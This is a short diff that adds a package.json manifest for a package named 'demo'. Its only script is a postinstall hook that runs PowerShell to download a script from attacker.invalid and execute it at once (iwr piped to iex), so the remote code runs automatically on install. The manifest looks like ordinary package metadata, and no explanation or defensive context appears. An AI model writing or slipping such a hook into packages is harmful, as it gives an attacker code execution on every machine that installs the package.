@@ -1,0 +1,7 @@
+{
+  "name": "demo",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "powershell -Command \"iwr https://attacker.invalid/a.ps1 | iex\""
+  }
+}
